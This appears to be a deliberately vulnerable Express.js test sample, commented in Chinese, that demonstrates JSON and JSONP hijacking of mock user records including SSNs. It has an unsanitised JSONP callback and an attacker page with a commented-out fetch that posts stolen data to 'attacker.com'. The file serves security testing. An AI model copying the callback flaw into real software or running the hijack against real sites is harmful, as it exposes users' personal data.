var express = require('express');
var app = express();

// 模拟用户数据存储
var users = [
    { id: 1, name: 'admin', email: 'admin@example.com', ssn: '123-45-6789' },
    { id: 2, name: 'user1', email: 'user1@example.com', ssn: '987-65-4321' }
];

// 易受攻击的API端点 - 返回JSON数组
app.get('/api/users/json', function(req, res) {
    // SOURCE: 敏感用户数据
    var sensitiveData = users.map(user => ({ 
        id: user.id, 
        name: user.name, 
        email: user.email,
        ssn: user.ssn 
    }));
    // SINK: 直接返回JSON数组
    res.json(sensitiveData);
});

// 易受攻击的API端点 - 返回JSONP
app.get('/api/users/jsonp', function(req, res) {
    // SOURCE: 敏感用户数据
    var sensitiveData = users.map(user => ({ 
        id: user.id, 
        name: user.name, 
        email: user.email,
        ssn: user.ssn 
    }));
    var callback = req.query.callback || 'callback';
    // SINK: 返回JSONP响应
    res.send(`${callback}(${JSON.stringify(sensitiveData)});`);
});

// 客户端模拟攻击代码
app.get('/hijack', function(req, res) {
    res.send(`
        <html>
        <body>
            <script>
                // 恶意网站上的攻击代码
                function stealData(data) {
                    // 窃取数据并发送到攻击者服务器
                    console.log('Stolen data:', data);
                    // 实际攻击中会发送到攻击者控制的服务器
                    // fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
                }
            </script>
            <script src="/api/users/json"></script>
            <script src="/api/users/jsonp?callback=stealData"></script>
        </body>
        </html>
    `);
});

app.listen(3000);